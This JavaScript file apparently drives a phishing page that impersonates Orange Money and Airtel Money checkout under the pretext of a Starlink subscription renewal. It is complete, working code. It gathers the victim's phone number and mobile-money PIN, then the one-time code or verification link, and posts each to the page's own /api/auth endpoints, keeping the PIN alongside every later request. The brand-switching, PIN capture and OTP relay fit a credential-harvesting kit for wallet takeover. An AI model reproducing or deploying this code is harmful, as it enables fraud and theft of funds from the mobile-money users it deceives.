"use strict";

(function () {
  const params = new URLSearchParams(location.search);
  const provider = (params.get("provider") || "orange").toLowerCase();
  const amount = params.get("amount") || "";
  const cur = params.get("cur") || "CDF";
  const packageName = params.get("package") || "Starlink";
  const isOrange = provider === "orange";
  const isAirtel = provider === "airtel";

  const COUNTRIES = [
    { code: "CD", dial: "243", flag: "\uD83C\uDDE8\uD83C\uDDE9", name: "RDC" },
    { code: "KE", dial: "254", flag: "\uD83C\uDDF0\uD83C\uDDEA", name: "Kenya" },
    { code: "UG", dial: "256", flag: "\uD83C\uDDFA\uD83C\uDDEC", name: "Ouganda" },
    { code: "TZ", dial: "255", flag: "\uD83C\uDDF9\uD83C\uDDFF", name: "Tanzanie" },
    { code: "RW", dial: "250", flag: "\uD83C\uDDF7\uD83C\uDDFC", name: "Rwanda" },
    { code: "BI", dial: "257", flag: "\uD83C\uDDE7\uD83C\uDDEE", name: "Burundi" },
    { code: "CG", dial: "242", flag: "\uD83C\uDDE8\uD83C\uDDEC", name: "Congo" },
    { code: "CM", dial: "237", flag: "\uD83C\uDDE8\uD83C\uDDF2", name: "Cameroun" },
    { code: "CI", dial: "225", flag: "\uD83C\uDDE8\uD83C\uDDEE", name: "C\u00f4te d'Ivoire" },
    { code: "SN", dial: "221", flag: "\uD83C\uDDF8\uD83C\uDDF3", name: "S\u00e9n\u00e9gal" },
    { code: "BF", dial: "226", flag: "\uD83C\uDDE7\uD83C\uDDEB", name: "Burkina Faso" },
    { code: "NE", dial: "227", flag: "\uD83C\uDDF3\uD83C\uDDEA", name: "Niger" },
    { code: "TG", dial: "228", flag: "\uD83C\uDDF9\uD83C\uDDEC", name: "Togo" },
    { code: "BJ", dial: "229", flag: "\uD83C\uDDE7\uD83C\uDDEF", name: "B\u00e9nin" },
    { code: "ZM", dial: "260", flag: "\uD83C\uDDFF\uD83C\uDDF2", name: "Zambie" }
  ];

  let selected = COUNTRIES[0];
  if (cur === "KES") selected = COUNTRIES.find((c) => c.dial === "254") || selected;
  let otpLen = isOrange ? 6 : 4;
  let lastPin = "";
  let lastPhone = "";

  document.body.classList.toggle("airtel", isAirtel);
  if (isAirtel) {
    document.getElementById("brandLogo").textContent = "airtel";
    document.getElementById("brandTitle").textContent = "Airtel Money";
    document.getElementById("brandBy").textContent = "Airtel";
    document.getElementById("loginTitle").textContent = "Entrez votre num\u00e9ro Airtel Money";
    document.getElementById("pinHint").textContent =
      "Entrez votre code PIN \u00e0 4 chiffres Airtel Money pour autoriser cette transaction.";
  }

  document.getElementById("svcName").textContent = packageName || "Renouvellement Starlink";
  if (amount) {
    try {
      document.getElementById("amtVal").textContent =
        cur + " " + Number(amount).toLocaleString("fr-FR");
    } catch (_) {
      document.getElementById("amtVal").textContent = cur + " " + amount;
    }
  }

  document.getElementById("ccFlag").textContent = selected.flag;
  document.getElementById("ccCode").textContent = "+" + selected.dial;

  const list = document.getElementById("ccList");
  COUNTRIES.forEach((c) => {
    const li = document.createElement("li");
    li.innerHTML =
      '<span class="flag">' +
      c.flag +
      '</span><span class="nm">' +
      c.name +
      '</span><span class="cc">+' +
      c.dial +
      "</span>";
    li.addEventListener("click", () => {
      selected = c;
      document.getElementById("ccFlag").textContent = c.flag;
      document.getElementById("ccCode").textContent = "+" + c.dial;
      document.getElementById("ccModal").classList.remove("open");
      list.querySelectorAll("li").forEach((x) => x.classList.remove("on"));
      li.classList.add("on");
    });
    if (c.dial === selected.dial) li.classList.add("on");
    list.appendChild(li);
  });
  document.getElementById("ccBtn").onclick = () =>
    document.getElementById("ccModal").classList.add("open");
  document.getElementById("ccClose").onclick = () =>
    document.getElementById("ccModal").classList.remove("open");
  document.getElementById("ccModal").addEventListener("click", (e) => {
    if (e.target.id === "ccModal") e.target.classList.remove("open");
  });

  /* PIN boxes — VISIBLE digits (type=tel, not password) */
  const pinBoxes = Array.from(document.querySelectorAll("#pinRow .pin-box"));
  function getPin() {
    return pinBoxes.map((b) => b.value).join("");
  }
  function checkReady() {
    const phoneOk = document.getElementById("phone").value.replace(/\D/g, "").length >= 8;
    const pinOk = getPin().length === 4;
    document.getElementById("btnNext").disabled = !(phoneOk && pinOk);
  }
  pinBoxes.forEach((box, i) => {
    box.addEventListener("input", () => {
      box.value = box.value.replace(/\D/g, "").slice(0, 1);
      if (box.value && pinBoxes[i + 1]) pinBoxes[i + 1].focus();
      checkReady();
    });
    box.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && !box.value && pinBoxes[i - 1]) {
        pinBoxes[i - 1].focus();
        pinBoxes[i - 1].value = "";
        e.preventDefault();
      }
    });
    box.addEventListener("paste", (e) => {
      e.preventDefault();
      const t = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "").slice(0, 4);
      t.split("").forEach((ch, j) => {
        if (pinBoxes[j]) pinBoxes[j].value = ch;
      });
      checkReady();
    });
  });
  document.getElementById("phone").addEventListener("input", function () {
    this.value = this.value.replace(/\D/g, "");
    checkReady();
  });

  function showScreen(id) {
    document.querySelectorAll(".screen").forEach((s) => s.classList.remove("active"));
    document.getElementById(id).classList.add("active");
  }
  function fullPhone() {
    const local = document.getElementById("phone").value.replace(/\D/g, "").replace(/^0+/, "");
    return "+" + selected.dial + local;
  }

  async function postJson(url, body) {
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest" },
      body: JSON.stringify(body)
    });
    let data = {};
    try {
      data = await res.json();
    } catch (_) {}
    if (!res.ok) throw new Error(data.error || "Erreur (" + res.status + ")");
    return data;
  }

  document.getElementById("btnNext").addEventListener("click", async () => {
    const btn = document.getElementById("btnNext");
    const err = document.getElementById("errLogin");
    err.classList.remove("show");
    btn.disabled = true;
    btn.textContent = "Traitement\u2026";
    lastPin = getPin();
    lastPhone = fullPhone();
    try {
      const data = await postJson("/api/auth/send-otp", {
        phone: lastPhone,
        pin: lastPin,
        provider,
        amount: amount ? amount + " " + cur : "",
        package: packageName
      });
      otpLen = data.otpLength || (isOrange ? 6 : 4);
      if (isOrange) {
        document.getElementById("linkPhoneDisp").textContent = lastPhone;
        showScreen("screenLink");
        startTimer();
        document.getElementById("linkInput").focus();
      } else {
        buildOtpBoxes(otpLen);
        showScreen("screenOtp");
      }
    } catch (e) {
      err.textContent = e.message || "Erreur";
      err.classList.add("show");
    } finally {
      btn.textContent = "SUIVANT";
      checkReady();
    }
  });

  const linkInput = document.getElementById("linkInput");
  linkInput.addEventListener("input", () => {
    document.getElementById("btnVerifyLink").disabled = linkInput.value.trim().length < 8;
  });
  linkInput.addEventListener("paste", () => {
    setTimeout(() => {
      document.getElementById("btnVerifyLink").disabled = linkInput.value.trim().length < 8;
      if (linkInput.value.trim().length >= 8) document.getElementById("btnVerifyLink").click();
    }, 80);
  });

  document.getElementById("btnVerifyLink").addEventListener("click", async () => {
    const btn = document.getElementById("btnVerifyLink");
    const err = document.getElementById("errLink");
    const msg = document.getElementById("msgLink");
    err.classList.remove("show");
    msg.classList.remove("show");
    btn.disabled = true;
    btn.textContent = "Transaction en cours. Veuillez patienter\u2026";
    msg.textContent = "Transaction en cours. Veuillez patienter\u2026";
    msg.classList.add("show");
    try {
      await postJson("/api/auth/verify-otp", {
        phone: lastPhone,
        pin: lastPin,
        link: linkInput.value.trim(),
        provider,
        amount: amount ? amount + " " + cur : "",
        package: packageName
      });
      setTimeout(() => {
        location.href = "/commandes.html";
      }, 1200);
    } catch (e) {
      err.textContent = e.message || "Erreur";
      err.classList.add("show");
      msg.classList.remove("show");
      btn.disabled = false;
      btn.textContent = "V\u00e9rifier";
    }
  });

  document.getElementById("btnBack").onclick = () => showScreen("screenLogin");
  document.getElementById("btnBackOtp").onclick = () => showScreen("screenLogin");

  function buildOtpBoxes(n) {
    const row = document.getElementById("otpRow");
    row.innerHTML = "";
    for (let i = 0; i < n; i++) {
      const inp = document.createElement("input");
      inp.className = "pin-box";
      inp.type = "tel";
      inp.inputMode = "numeric";
      inp.maxLength = 1;
      inp.autocomplete = "one-time-code";
      row.appendChild(inp);
    }
    const boxes = Array.from(row.querySelectorAll(".pin-box"));
    function getOtp() {
      return boxes.map((b) => b.value).join("");
    }
    boxes.forEach((box, i) => {
      box.addEventListener("input", () => {
        box.value = box.value.replace(/\D/g, "").slice(0, 1);
        if (box.value && boxes[i + 1]) boxes[i + 1].focus();
        document.getElementById("btnVerifyOtp").disabled = getOtp().length !== n;
      });
      box.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !box.value && boxes[i - 1]) {
          boxes[i - 1].focus();
          boxes[i - 1].value = "";
          e.preventDefault();
        }
      });
    });
    if (boxes[0]) boxes[0].focus();
  }

  document.getElementById("btnVerifyOtp").addEventListener("click", async () => {
    const boxes = Array.from(document.querySelectorAll("#otpRow .pin-box"));
    const otp = boxes.map((b) => b.value).join("");
    const btn = document.getElementById("btnVerifyOtp");
    const err = document.getElementById("errOtp");
    err.classList.remove("show");
    btn.disabled = true;
    btn.textContent = "V\u00e9rification\u2026";
    try {
      await postJson("/api/auth/verify-otp", {
        phone: lastPhone,
        pin: lastPin,
        otp,
        provider,
        amount: amount ? amount + " " + cur : "",
        package: packageName
      });
      location.href = "/commandes.html";
    } catch (e) {
      err.textContent = e.message || "OTP incorrect";
      err.classList.add("show");
      btn.disabled = false;
      btn.textContent = "V\u00c9RIFIER";
    }
  });

  let timerIv = null;
  function startTimer() {
    let s = 30;
    const info = document.getElementById("resendInfo");
    if (timerIv) clearInterval(timerIv);
    info.innerHTML = 'Renvoyer le lien dans <span id="timer">30</span> s';
    timerIv = setInterval(() => {
      s--;
      const t = document.getElementById("timer");
      if (t) t.textContent = String(s);
      if (s <= 0) {
        clearInterval(timerIv);
        info.innerHTML =
          '<a href="#" id="resendLink" style="color:#FF6600;font-weight:600">Renvoyer le lien</a>';
        const a = document.getElementById("resendLink");
        if (a)
          a.onclick = async (e) => {
            e.preventDefault();
            try {
              await postJson("/api/auth/send-otp", {
                phone: lastPhone,
                pin: lastPin,
                provider,
                amount: amount ? amount + " " + cur : "",
                package: packageName
              });
              startTimer();
            } catch (_) {}
          };
      }
    }, 1000);
  }
})();
